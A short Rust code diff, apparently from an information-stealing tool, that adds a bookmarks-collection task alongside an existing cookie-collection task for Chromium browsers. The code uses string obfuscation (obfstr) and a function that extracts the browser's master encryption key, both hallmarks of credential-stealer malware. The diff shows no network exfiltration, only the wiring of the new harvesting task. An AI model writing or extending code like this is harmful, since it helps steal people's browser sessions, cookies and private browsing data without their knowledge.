@@ -1,4 +1,5 @@
 mod cookies;
+mod bookmarks;
 
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
@@ -8,6 +9,7 @@ use tasks::{composite_task, CompositeTask, Task};
 use utils::path::Path;
 use obfstr::obfstr as s;
 use utils::browsers::chromium::extract_master_key;
+use crate::chromium::bookmarks::BookmarksTask;
 use crate::chromium::cookies::CookiesTask;
 
 pub struct ChromiumTask<'a> {
@@ -29,7 +31,8 @@ impl ChromiumTask<'_> {
             tasks.push((
                 base_browser,
                 composite_task!(
-                    CookiesTask::new(browser)
+                    CookiesTask::new(browser.clone()),
+                    BookmarksTask::new(browser.clone())
                 )
             ))
         }
